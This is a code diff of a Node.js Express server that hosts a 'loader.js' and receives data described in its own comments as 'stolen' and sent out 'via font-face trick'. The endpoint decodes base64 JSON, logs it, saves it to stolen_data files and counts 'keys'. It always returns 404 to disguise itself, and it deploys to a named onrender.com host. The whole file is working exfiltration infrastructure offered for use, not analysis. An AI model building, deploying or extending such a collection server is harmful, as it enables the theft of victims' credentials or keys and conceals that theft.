@@ -3,12 +3,12 @@ const path = require('path');
 const fs = require('fs');
 
 const app = express();
-const PORT = process.env.PORT || 10000;   // ← THIS IS THE IMPORTANT LINE
+const PORT = process.env.PORT || 10000;
 
-// Serve your loader.js at /axiom/loader.js
-app.use('/axiom', express.static(path.join(__dirname, 'public')));
+// === IMPORTANT: Serve static files from public folder ===
+app.use('/axiom', express.static(path.join(__dirname, 'public/axiom')));
 
-// Catch-all for root and unknown paths (shows 404 like original)
+// Root and /i routes (to mimic original behavior)
 app.get('/', (req, res) => {
     res.status(404).send('Not Found');
 });
@@ -17,7 +17,7 @@ app.get('/i', (req, res) => {
     res.status(404).json({ detail: "Not Found" });
 });
 
-// The font-face exfil endpoint - this is where data arrives
+// The important endpoint that receives stolen data via font-face trick
 app.get('/i/:data', (req, res) => {
     const encoded = req.params.data;
     let payload = {};
@@ -26,28 +26,24 @@ app.get('/i/:data', (req, res) => {
         const jsonString = Buffer.from(encoded, 'base64').toString();
         payload = JSON.parse(jsonString);
 
-        // Log to Render Logs (you will see this!)
         console.log('✅ DATA RECEIVED:', JSON.stringify(payload, null, 2));
 
-        // Save to file (persists on Render disk)
+        // Save to file
         const logDir = path.join(__dirname, 'stolen_data');
         if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);
 
         const filename = `stolen_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
         fs.writeFileSync(path.join(logDir, filename), JSON.stringify(payload, null, 2));
 
-        console.log(`💾 SAVED to stolen_data/${filename} | ${payload.keys ? payload.keys.length : 0} keys`);
+        console.log(`💾 SAVED: stolen_data/${filename}`);
     } catch (e) {
         console.error('❌ Decode error:', e.message);
     }
 
-    // Always return 404 like the original bloomsnipers setup
     res.status(404).json({ detail: "Not Found" });
 });
 
-// Start the server on the correct Render port
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📍 Loader URL: https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'your-app'}.onrender.com/axiom/loader.js`);
-    console.log(`📥 Data endpoint: https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'your-app'}.onrender.com/i/...`);
+    console.log(`📍 Loader should be available at: https://bloom-sniper-backend.onrender.com/axiom/loader.js`);
 });
